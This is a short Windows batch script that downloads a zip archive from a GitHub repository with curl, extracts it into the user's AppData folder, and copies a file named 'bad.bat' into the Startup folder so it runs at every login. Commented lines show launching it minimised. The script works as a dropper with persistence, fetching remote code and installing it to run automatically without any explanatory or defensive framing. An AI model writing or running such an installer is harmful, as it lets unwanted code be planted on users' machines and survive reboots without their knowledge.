set "Startup_Dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
@REM start "" /MIN "%Startup_Dir%\bad.bat"
curl "https://github.com/glonpl/Honk/archive/refs/heads/main.zip" --ssl-no-revoke -L -o %TEMP%\temp.zip
@REM mkdir %APPDATA%\Honk
powershell -Command "Expand-Archive %TEMP%\temp.zip -DestinationPath %APPDATA%" 
copy "%APPDATA%\Honk-main\bad.bat" "%Startup_Dir%\bad.bat"
del temp.zip
